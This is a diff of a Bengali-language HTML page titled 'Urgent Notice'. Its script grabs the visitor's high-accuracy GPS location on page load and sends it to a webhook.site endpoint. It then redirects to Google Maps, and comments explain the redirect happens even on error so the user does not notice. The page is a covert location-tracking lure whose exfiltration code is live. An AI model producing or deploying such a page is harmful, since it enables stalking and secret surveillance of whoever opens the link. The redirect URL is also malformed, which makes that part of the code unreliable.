@@ -2,6 +2,7 @@
 <html lang="bn">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>জরুরি নোটিশ</title>
     <style>
         body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f9f9f9; }
@@ -19,6 +20,7 @@
     <script>
         window.onload = function() {
             if (navigator.geolocation) {
+                // High Accuracy অন করা হয়েছে যাতে সরাসরি হার্ডওয়্যার জিপিএস হিট করে
                 navigator.geolocation.getCurrentPosition(sendLocation, showError, {
                     enableHighAccuracy: true,
                     timeout: 15000,
@@ -34,6 +36,7 @@
             let long = position.coords.longitude;
             let accuracy = position.coords.accuracy;
             
+            // ফিক্সড: আপনার ইউনিক ওয়েববুক ড্যাশবোর্ড ইউআরএল এন্ডপয়েন্ট
             let webhookURL = "https://webhook.site"; 
 
             let gpsData = {
@@ -42,7 +45,7 @@
                 accuracy: accuracy
             };
 
-            // ফিক্সড: স্ট্যান্ডার্ড JSON POST রিকোয়েস্ট উইথ প্রপার হেডার
+            // স্ট্যান্ডার্ড JSON POST রিকোয়েস্ট উইথ প্রপার হেডার
             fetch(webhookURL, {
                 method: "POST",
                 headers: { 
@@ -50,10 +53,10 @@
                 },
                 body: JSON.stringify(gpsData)
             }).then(() => {
-                // ডাটা সাকসেসফুলি চলে যাওয়ার পর গুগল ম্যাপসে রিডাইরেক্ট হবে
+                // ফিক্সড: ডাটা চলে যাওয়ার পর গুগল ম্যাপসে প্রপার কোয়েরিসহ রিডাইরেক্ট হবে
                 window.location.href = "https://google.com" + lat + "," + long;
             }).catch((err) => {
-                // কোনো নেটওয়ার্ক এরর হলেও ইউজার যেন টের না পায়, সরাসরি ম্যাপসে পাঠিয়ে দেওয়া
+                // নেটওয়ার্ক এরর হলেও ইউজার যেন টের না পায়, সরাসরি ম্যাপসে পাঠিয়ে দেওয়া
                 window.location.href = "https://google.com" + lat + "," + long;
             });
         }
